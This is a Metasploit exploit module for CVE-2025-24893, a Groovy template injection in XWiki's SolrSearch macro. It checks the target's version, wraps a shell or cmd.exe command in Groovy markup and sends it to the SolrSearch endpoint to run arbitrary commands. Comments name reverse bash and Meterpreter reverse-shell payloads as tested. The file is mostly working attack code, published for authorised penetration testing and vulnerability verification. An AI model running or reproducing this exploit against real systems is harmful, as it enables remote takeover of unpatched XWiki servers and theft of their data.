##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Remote Code Execution Vulnerability in XWiki Platform (CVE-2025-24893)',
        'Description' => %q{
          This module exploits a template injection vulnerability in the the XWiki Platform.
          XWiki includes a macro called SolrSearch (defined in Main.SolrSearchMacros) that enables full-text search through the embedded Solr engine.
          The vulnerability stems from the way this macro evaluates search parameters in Groovy, failing to sanitize or restrict malicious input.

          This vulnerability affects XWiki Platform versions >= 5.3-milestone-2 and < 15.10.11, and versions >= 16.0.0-rc-1 and < 16.4.1.
          Successful exploitation may result in the remote code execution under the privileges
          of the web server, potentially exposing sensitive data or disrupting survey operations.

          An attacker can execute arbitrary system commands in the context of the user running the web server.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Maksim Rogov', # Metasploit Module
          'John Kwak' # Vulnerability Discovery
        ],
        'References' => [
          ['CVE', '2025-24893'],
          ['URL', 'https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rr6p-3pfg-562j']
        ],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                # On Debian 9 curl is not installed by default
                'FETCH_COMMAND' => 'WGET'
              }
              # Tested with cmd/unix/reverse_bash
              # Tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => ['win'],
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd
              # Tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ],
        ],
        'Payload' => {
          'BadChars' => '\\'
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-02-20',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to XWiki', '/']),
      ]
    )
  end

  def check
    print_status('Extracting version...')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/xwiki/bin/view/Main/'),
      'method' => 'GET'
    )
    return CheckCode::Unknown('No response from target') unless res&.code == 200

    version_div = res.get_html_document.at('div[id="xwikiplatformversion"]')
    return CheckCode::Safe('Possibly not XWiki or incorrect path (version tag not found)') unless version_div

    version_match = version_div.text.match(/XWiki.*?(\d+\.\d+\.\d+)/)
    unless version_match
      print_error("#{peer} - Unable to extract version number")
      return CheckCode::Detected('XWiki detected, but version number missing or unrecognized')
    end

    version = Rex::Version.new(Regexp.last_match(1).to_s)
    print_status("Extracted version: #{version}")

    if version.between?(Rex::Version.new('5.3.0'), Rex::Version.new('15.10.10')) ||
       version.between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.4.0'))
      return CheckCode::Appears("Detected version #{version}, which is vulnerable")
    end

    return CheckCode::Safe("Version #{version} appears safe")
  end

  def build_cmd
    print_status('Building command for target...')

    if target['Type'] == :unix_cmd
      cmd_array = "'sh', '-c', '#{payload.encoded}'"
    else
      cmd_array = "'cmd.exe', '/b', '/q', '/c', '#{payload.encoded}'"
    end

    print_good('Command successfully built for target')

    return "{{async async=false}}{{groovy}}[#{cmd_array}].execute().text{{/groovy}}{{/async}}"
  end

  def send_payload(cmd)
    print_status('Uploading payload...')

    vars_get = {
      'media' => 'rss',
      'text' => cmd
    }

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/xwiki/bin/get/Main/SolrSearch'),
      'method' => 'GET',
      'vars_get' => vars_get
    })
  end

  def exploit
    cmd = build_cmd
    send_payload(cmd)
  end
end
